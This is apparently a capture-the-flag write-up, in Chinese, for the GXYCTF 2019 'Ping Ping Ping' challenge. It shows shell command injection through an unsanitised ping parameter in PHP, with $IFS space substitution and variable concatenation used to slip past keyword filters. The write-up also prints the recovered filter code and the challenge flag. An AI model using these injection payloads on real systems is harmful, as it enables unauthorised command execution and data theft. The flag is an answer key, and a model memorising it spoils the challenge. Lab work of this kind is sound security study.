# [GXYCTF 2019]Ping Ping Ping

进入环境有一行字

```txt
/?ip=
```

结合题目标题，应该是通过 get 传一个 ip 参数，服务器对其进行 ping 操作，输入 `/?ip=1;ls`

```txt
PING 11 (0.0.0.11): 56 data bytes
flag.php
index.php
```

ls 被执行了，尝试 `cat flag.php`，回显 `fxck your space!`，貌似空格被过滤了，查阅 Linux 绕过空格的方法。

```txt
cat flag.txt
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
```

`/?ip=1;cat$IFS$1flag.php` 回显 `fxck your flag!`，flag 被过滤，那先查看一下 index.php，得到内容

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

过滤了一些特殊符号，过滤 flag 的逻辑是匹配 "\*f.\*l.\*a.\*g."，只要使 flag 不依次出现就行，这里可以使用变量拼接，原理如 `a=s;l$a` 等同于 `ls`。  
所以这里可以这样构造，`?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php`，flag 在网页注释里找到

```txt
/?ip=
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
<?php
 $flag = "flag{49c507ce-26b2-43ab-9b28-2bb039e15f11}";
 ?>
```

在注释里有点怪，使用 tac 指令可以显示出来 `/?ip=127.0.0.1;a=g;tac$IFS$1fla$a.php;`，网页源码

```txt
/?ip=
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
?>
$flag = "flag{49c507ce-26b2-43ab-9b28-2bb039e15f11}";
<?php
```

~~是因为 php 执行的 shell 指令输出内容会自动包裹进 `<?php ?>` 吗，让我研究一会。~~

源码中的 `print_r($a);`
